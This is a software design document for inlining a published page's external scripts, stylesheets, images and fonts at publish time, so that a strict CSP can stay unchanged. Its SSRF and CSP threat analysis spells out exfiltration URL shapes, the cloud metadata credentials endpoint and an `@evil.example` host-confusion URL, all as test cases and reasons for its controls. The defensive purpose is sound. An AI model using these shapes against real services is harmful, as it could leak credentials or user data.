# Inlining a page's external assets at publish time — design

Date: 2026-08-03

## Problem

An uploaded page that loads JavaScript from a CDN renders without it. Chrome
reports:

```
Content Security Policy of your site blocks some resources
  https://artifactcdn.diabrowser.engineering/ajax/libs/animejs/anime.min.js
  blocked   script-src-elem   raw:0
```

The CSP at `app/p/[slug]/raw/route.ts:20-31` sets
`script-src 'unsafe-inline' 'unsafe-eval' blob:` and no host source anywhere in
the policy. A source list with no host expression matches no URL, so
`script-src-elem` falls back to `script-src` and **every** `<script src>` is
blocked — external or same-origin, it makes no difference.

The same policy blocks `<link rel=stylesheet>`, `<img src>` and every font a
stylesheet reaches for. `docs/superpowers/specs/2026-08-02-dia-artifact-picker-design.md:377`
already recorded the consequence: "every artifact links out to stylesheets and
scripts that are never published, so what reaches the site is unstyled." Fixing
only the script leaves the other half of the same root cause live.

The blocked asset was checked: it is public, `application/javascript`,
`access-control-allow-origin: *`, 106 KB, Cloudflare-fronted. Note what the path
does *not* contain — `/ajax/libs/animejs/anime.min.js` is a cdnjs path with the
version segment stripped, so that host serves whatever "latest" happens to be at
request time.

## What the CSP was actually written to stop

The comment at `app/p/[slug]/raw/route.ts:5-19` is precise about this, and it
matters for choosing a fix: the policy does not ban JavaScript. `'unsafe-inline'`
is already there, and `'unsafe-eval'` beside it. An inline `<script>` in an
uploaded page runs today.

What the policy bans is **network requests**. `connect-src 'none'` closes fetch,
XHR and beacon, but a subresource load is a real GET, so the passive directives
had to be closed too — `img-src https:` alone would let a page exfiltrate
whatever a student typed via `<img src="https://…?d=answer">`.

So the document that policy was written for is a self-contained one. The fix is
to make documents self-contained rather than to widen the policy.

## Goal

A page that references an external script, stylesheet, image or font is rewritten
at publish time into one document that carries those assets inside itself. It
renders identically at `/p/[slug]` with **no CSP change and no third-party
request from a student's browser, ever**.

An asset that cannot be inlined never blocks the publish. It is left alone and
reported by name.

## Approach, and the two that were rejected

**Chosen: inline at publish.** The stored HTML becomes self-contained, so
`'unsafe-inline'` already runs it and no directive is touched. It also freezes
the exact bytes that worked — worth more here than it sounds, because that CDN
path carries no version, so a page that renders today can change under itself
tomorrow without anyone touching the site.

**Rejected: allow the CDN host in `script-src`.** Three lines, and it keeps pages
small and cacheable. It also reverses the invariant the route comment defends at
length: with a host source in `script-src`, a page can exfiltrate a student's
typed answer as `<script src="https://artifactcdn…/x?d=answer">`. That the
author of a page is Jenn or a model she prompted makes the risk small, not
absent, and the allowlist would grow by one host per authoring tool she tries.
The unversioned path is the second objection: the page silently changes when the
mirror updates.

**Rejected: vendor the libraries in the repo.** No network anywhere and no CSP
change, but every library Dia reaches for becomes a code change and a deploy,
and with no version segment in the path we would be guessing which version each
page was written against.

## Where it runs

Both write paths already validate, then save:

| Path | Validate | Save |
|---|---|---|
| `POST /api/pages` — the shell script and the extension | `parsePagePayload` (`app/api/pages/route.ts:84`) | `savePage` (`:122`) |
| The admin's drop zone | `validatePage` (`app/page-actions.ts:63-68`) | `saveOrExplain` (`:97-113`) |

The inline step goes between those two, at both call sites, calling one shared
function. Two call sites, one implementation.

Not inside `savePage`: that is a Prisma module, this step needs a network
adapter, and its result — the list of what could not be inlined — has to reach
the caller rather than the database.

Nothing is inlined at render time. `/p/[slug]/raw` keeps serving `page.html`
byte for byte, which is what keeps the download-and-re-edit round trip honest and
what stops the served document from drifting from the stored one.

## Modules

| Module | Purity | Job |
|---|---|---|
| `lib/asset-policy.ts` | pure, tested | `isAllowedAssetUrl`, `contentTypeMatches`, `assetKindForUrl`, the skip reasons |
| `lib/page-refs.ts` | pure, tested | find refs, rewrite refs, the escaping |
| `lib/asset-fetch.ts` | impure adapter | `fetchAsset` — the only thing that opens a socket |
| `lib/page-inline.ts` | async, fetcher injected, tested with a fake | the walk, the budget, the report |

The fetcher is **injected** into `lib/page-inline.ts` rather than imported by it.
That is the `lib/whiteboard-hit.ts` arrangement — its text measurer is injected
so the module stays pure and testable with a fake — and it is what lets the
depth, budget and priority rules be tested without a network.

Four modules rather than one because three of the four are pure and one is not,
and the convention in `CLAUDE.md` is that anything with a rule in it is a pure
function in `lib/` with a test in `tests/lib/`. Fusing them would put the one
untestable thing in the middle of the three testable ones.

Which hosts may be fetched and which content types count are one module rather
than two, because they are one question asked twice: is this response the thing
the document asked for? The type naming what kind of asset a ref is lives there
too — the policy is written against it, and defining it beside the matcher would
make those two modules import each other.

## What counts as a ref

There is no HTML parser here and none is being added. `lib/page-refs.ts` is a
deliberately small matcher in the spirit of `lib/inline-markup.ts`, which is a
tiny inline markup parser and not Markdown for the same reason: the input shape
is narrow and a dependency is not free.

| Shape | Becomes |
|---|---|
| `<script src="…" …></script>` | `<script …>code</script>`, attributes preserved minus `src` |
| `<link rel="stylesheet" href="…">` | `<style>css</style>` in the same position |
| `<img src="…">` | `<img src="data:…;base64,…">` |
| `url(…)` in a `<style>` or a fetched stylesheet | `url(data:…;base64,…)` |
| `@import url(…)` in a fetched stylesheet | the stylesheet's text, inline |

Never touched: `<a href>`, and anything whose URL is `data:`, `blob:`, `#`,
`mailto:` or `tel:`. `rel` is matched as a whitespace-separated token list, so
`rel="preload stylesheet"` counts and `rel="icon"` does not.

`srcset` is not inlined, and this is a hard limit rather than an unimplemented
feature: `srcset` is a comma-separated list, and a base64 data URI contains
commas. There is no way to put one in a `srcset` entry without corrupting the
list. It is left alone and not reported either, because a report implies there is
something a different tool or a later version could do.

### Two escaping traps

**A script body containing `</script>` terminates the tag early.** The HTML
tokenizer does not know it is inside a JavaScript string literal. Every
occurrence of `</script` is rewritten to `<\/script` on the way in, which is
identical JavaScript in a string, a template literal or a regex literal.

The residual: `String.raw` around a template literal holding `</script>` would
change meaning, because `\/` stops being an escape there. Accepted and recorded
rather than defended — it needs a library that embeds that exact byte sequence
inside a raw template, and the alternative is refusing to inline any script that
mentions `</script`, which would reject libraries that legitimately carry HTML
snippets.

**A stylesheet containing `</style` cannot be escaped the same way.** CSS
escapes do not apply inside a comment, so there is no substitution that is safe
in every context. A fetched stylesheet containing `</style` is **skipped and
reported**. Rare, honest, and the failure is visible rather than a page that
half-renders.

### `defer` and `async` stop meaning anything

Both are no-ops on an inline classic script, so an inlined library runs where its
tag sits rather than after parsing. The attributes are kept — the source should
still read the way its author wrote it — but the timing genuinely changes.

Accepted, because of what is on the allowlist: every host there serves libraries,
and a library running *earlier* is harmless. The case this would break is a
deferred script that touches the DOM before it exists, which is application code,
and application code is not on a CDN. The alternatives were all worse: wrapping
the code in a `DOMContentLoaded` listener moves its top-level declarations out of
global scope and breaks any library that defines one, and emitting
`<script type="module">` to get deferral back changes the scope in the same way.

### `&amp;` in an attribute

A URL in an HTML attribute is entity-encoded, and Google Fonts links are the
common case: `href="…/css2?family=Inter&amp;display=swap"`. Fetching that string
literally asks for a parameter named `amp;display`. The extracted URL is decoded
before it is fetched — `&amp;` and the numeric forms of `&`, and nothing else,
because `&` is the only character that appears entity-encoded in a URL in
practice.

## The depth rule

**Two fetches deep, and no third.** Counted in fetches, not in documents — an
inline `<style>` is not a fetch, so an `@import` inside one is the first fetch and
not the second.

Two is not arbitrary. `fonts.googleapis.com` answers a stylesheet request with
*CSS* that points at `fonts.gstatic.com`, so a one-fetch implementation inlines
the stylesheet and leaves its fonts blocked — the page arrives with the wrong
typeface and no error anyone can act on. Both common shapes need exactly two: a
`<link>` to Google Fonts is the stylesheet then its woff2, and an
`@import url(…)` inside a `<style>` — the shape an LLM-authored page almost always
uses — is the same two. A third has no case behind it beyond a stylesheet that
imports a stylesheet that names a font, and recursion over input the server does
not control is a budget problem waiting to happen.

A relative `url()` inside a fetched stylesheet resolves against **the
stylesheet's** URL, not the page's — `new URL(ref, stylesheetUrl)` — and the
resolved absolute URL is re-checked against the allowlist. Resolution preserves
the host, so a stylesheet cannot use a relative ref to reach off the allowlist,
but the check is repeated rather than reasoned about.

`<base href>` does not enter into it: document-level relative refs are not
inlined at all, and `base-uri 'none'` in the CSP means the framed page cannot set
one anyway.

## The fetcher is an SSRF primitive, and is treated as one

The URL arrives in a request body, the server fetches it, and the response is
inlined into a document that is then readable at `/p/[slug]/raw`. That is a full
read primitive: whoever holds `PAGES_UPLOAD_TOKEN` could otherwise point it at
`http://169.254.169.254/latest/meta-data/iam/security-credentials/` and read the
box's S3 backup credentials out of a published page. Five controls, none
optional (OWASP A10; SEC-ACC-1.00, deny by default):

1. **Allowlist.** `isAllowedAssetUrl` requires `https:`, a host matched
   **exactly** against `ASSET_HOSTS`, no explicit port, and no credentials in the
   URL. Exact rather than suffix: a suffix match on `.jsdelivr.net` would admit
   any subdomain anyone can register there, and
   `https://cdnjs.cloudflare.com@evil.example/x` has host `evil.example` — the
   check must read `URL.host`, never the raw string.
2. **`redirect: "error"`.** The control that carries the most weight and is the
   easiest to leave out. Without it an allowlisted host that answers `302` to
   `http://169.254.169.254/` turns the allowlist into decoration. A redirect is
   an error and the ref is reported, not followed.
3. **`AbortSignal.timeout(5_000)`.** A hung fetch otherwise holds the publish
   request open for as long as the far end likes.
4. **A byte cap per asset and a budget for the document** — see below.
5. **A content-type check per kind.** Without it a Cloudflare 404 page lands
   inside a `<script>` and the page fails with a syntax error at a line that does
   not exist in anything Jenn wrote.

| Kind | Accepted content type |
|---|---|
| script | contains `javascript` or `ecmascript` |
| style | contains `text/css` |
| image | starts with `image/` |
| font | starts with `font/`, or `application/octet-stream` when the path ends `.woff2`, `.woff`, `.ttf` or `.otf` |

`application/octet-stream` is accepted for fonts only, because serving a font as
octet-stream is a common CDN misconfiguration and the extension check keeps it
narrow.

### `ASSET_HOSTS`

```
artifactcdn.diabrowser.engineering    Dia's mirror — the host in the report
cdnjs.cloudflare.com
cdn.jsdelivr.net
unpkg.com
cdn.tailwindcss.com
fonts.googleapis.com                  the stylesheet
fonts.gstatic.com                     the fonts it points at
```

The Google pair is listed together because either alone is useless: the
stylesheet without the fonts renders in a fallback face, and the fonts without
the stylesheet are unreachable.

Module CDNs — `esm.sh`, `cdn.skypack.dev`, `jspm.dev` — are **deliberately
absent**. An ES module's `import` resolves against the module's own URL, so
inlining one leaves its imports with nothing to resolve against: the ref would
turn a page that is merely blocked into a page that is broken, which is worse
than what it replaces. A `<script type="module" src>` from an allowlisted host is
still inlined, and can still fail this way if it imports; accepted, because
detecting it means parsing JavaScript.

## The budget

`MAX_PAGE_BYTES` is 2 MB (`lib/page-html.ts:1`), and there is an ordering trap:
`validatePageHtml` runs **before** inlining, and `savePage` does not validate, so
a naive implementation stores a document larger than the app's own limit and the
next edit of that page fails validation on content the server itself created.

So the budget is `MAX_PAGE_BYTES − byteLength(html)`, less a small margin, spent
as the walk proceeds. What does not fit is reported with that as the reason. The
result is asserted with `validatePageHtml` afterwards; if that ever fails the
original HTML is stored unchanged and everything is reported — a publish is never
lost to this.

Data URIs are measured **encoded**. Base64 costs a third on top of the bytes, and
budgeting on the raw length would overshoot by exactly that much.

Budget is allocated by kind before any replacement happens: **scripts, then
stylesheets, then images and fonts.** A missing image degrades to a gap; a
missing script degrades to a page that does nothing. Within a kind, document
order.

Replacement then walks the refs by position and concatenates slices, rather than
substituting strings. Two refs to the same URL, or one ref whose text is a
substring of another's, both break a naive `replace` — and an artifact that uses
the same icon twice is not exotic.

## The report

Anything not inlined leaves the document exactly as it was and appears in a list
of `{ url, reason }`. Reasons, all of them phrased for a teacher rather than a
developer:

| Reason | Cause |
|---|---|
| not on the list of allowed sources | host not in `ASSET_HOSTS`, or not https |
| could not be fetched | network error, non-200, redirect, timeout |
| was not the kind of file it claimed | content-type mismatch |
| would not fit inside the 2 MB page limit | budget exhausted |
| is a file next to the page, and only the page itself is published | a relative ref |
| could not be inlined safely | a stylesheet containing `</style`, or an `@import` carrying a media condition |
| sits behind too many stylesheets to reach | past the two-fetch depth |

Publishing never fails because of one of these. That is the same contract
`readSections`, `readOps` and `readPageKind` already hold — discard what is
malformed rather than throwing — and the reason is the same: the alternative
blocks a whole page over one font.

Three surfaces, because there are three ways in and a warning nobody sees is the
failure mode this project has already argued about
(`2026-08-02-dia-artifact-picker-design.md:304-322`):

- `POST /api/pages` adds `skipped` to its 201 body. `tools/publish-dia-artifact.sh`
  prints a `⚠` line per entry, beside the `✓ $URL` it already prints.
- `tools/publish-extension/background.js` appends the count to its notification
  and the full list to the console line it already writes.
- `PageEditor` renders a notice beside the existing `error` and `saved` states.
  `onSubmit` is already typed `Promise<unknown>` (`components/admin/PageEditor.tsx:27`),
  so `createPage` and `updatePage` can both return `{ slug, skipped }` without a
  prop-shape argument. `updatePage` returns the slug it was handed, so one shape
  covers both.

Relative refs are reported even though nothing is attempted for them. The picker
warns about those at selection time on Jenn's machine, but the drag-and-drop and
extension paths have no equivalent, and "only index.html is published" is the
thing she needs told exactly when a page arrives without its stylesheet.

## Existing pages

`scripts/backfill-page-assets.mjs`, in the mould of `scripts/backfill-sections.mjs`:
walk every `html` page, run the same inliner, write back what changed, print a
line per page with its skipped list. Idempotent — a page with no external refs is
skipped, so re-running is safe.

That script imports `../lib/*.ts` directly, exactly as `backfill-sections.mjs`
already does, which constrains the new modules to TypeScript that Node's type
stripper can handle: `import type` for type-only imports, and no enums,
namespaces or parameter properties. The codebase already writes this way.

The alternative was re-publishing by hand, rejected because nothing on the shelf
says which pages are degraded, so she would be guessing.

## Unchanged, deliberately

- **The CSP and the sandbox.** Not one directive moves, and
  `sandbox="allow-scripts"` on `/p/[slug]` is untouched. If this change appears to
  need a CSP edit, something has gone wrong in it.
- **`HtmlPreview` stays `sandbox=""`.** A page drawn entirely by JavaScript still
  previews blank in a tile. That is documented in `CLAUDE.md` as accepted — a
  shelf mounts a dozen documents at once and an autoplaying thumbnail has no
  control surface — and inlining does not change the reasoning.
- **`/p/[slug]/raw` serves `page.html` verbatim,** with the same headers and the
  same CSP. The `<a download>` in the admin editor keeps working, and the file it
  yields now already has its assets inline, so re-uploading it is a no-op for
  this step.
- **Sibling files on disk.** Only `index.html` is uploaded, so the server never
  sees them. They stay a report line rather than a feature.
- **`tools/publish-dia-artifact.sh`'s selection and publish path.** It gains a
  `⚠` line for the response's `skipped`. Nothing about which file it picks or how
  it posts changes.

## Testing

Unit tests in `tests/lib/`, per the convention. No test opens a socket:
`lib/page-inline.ts` takes its fetcher as an argument, and every case is driven
with a fake.

`asset-policy.test.ts` — https only; unknown host; a subdomain of an allowed
host; `https://cdnjs.cloudflare.com@evil.example/x`; an explicit port; an IPv4
and an IPv6 literal; `169.254.169.254`; mixed-case host; garbage input returns
false rather than throwing.

`page-refs.test.ts` — each shape found; `<a href>` and `rel="icon"` ignored;
`data:`, `blob:`, `#`, `mailto:` ignored; `rel="preload stylesheet"` matched;
single-quoted, double-quoted and unquoted attributes; `&amp;` decoded; a relative
ref reported and not fetched; script attributes preserved minus `src`;
`</script>` escaped in the body; two refs to the same URL both replaced; a ref
whose text is a substring of another's not corrupted.

`page-inline.test.ts` — a script inlined; a stylesheet's font resolved at depth 2
and nothing attempted at depth 3; a relative `url()` resolved against the
stylesheet's URL; budget exhaustion reporting the remainder and the result still
passing `validatePageHtml`; wrong content-type skipped; fetch failure skipped;
`</style` skipped; already-inlined HTML unchanged on a second run.

The five fetcher controls cannot be covered by a fake fetcher — they live in the
adapter, which is deliberately not unit-tested, the same exemption components and
Prisma access have. `redirect: "error"` in particular is a code-review item and
is called out here so a reviewer knows to look for it.

## Manual verification

The checks that matter need a real browser and a real console, so they belong to
whoever has one. `docs/superpowers/plans/2026-08-03-inlining-page-assets.md` ends
with the numbered list.

The invariant to check, above all the others: **on `/p/<slug>`, the Network tab
shows zero third-party requests.** That is what the CSP was protecting and what
this change has to leave true.

## Not doing

**Sibling files on disk.** Inlining `./styles.css` from beside `index.html` needs
the artifact directory, which only `tools/publish-dia-artifact.sh` can see. It is
a second implementation in bash 3.2 and JXA with no test harness, and Jenn's own
artifacts are already single files. Reported, not fixed.

**A degraded flag on the page row.** Marking pages that still hold un-inlinable
refs, so the admin's Pages tab shows which are incomplete, means a schema column
and UI for a condition the publish-time report already announces once. Larger
than the fix.

**Caching fetched assets.** Two pages using the same library fetch it twice.
Publishing happens a few times a week and the fetch is a few hundred
milliseconds; a cache is a store to invalidate for no gain anyone would notice.

**Touching the CSP to allow same-origin scripts.** Worth recording as a trap
rather than an option: `script-src 'self'` would not reliably work here anyway,
because the framed document has an opaque origin under
`sandbox="allow-scripts"`, and `'self'` matching an opaque origin is exactly the
kind of behaviour that differs between browsers. Inlining sidesteps the question.
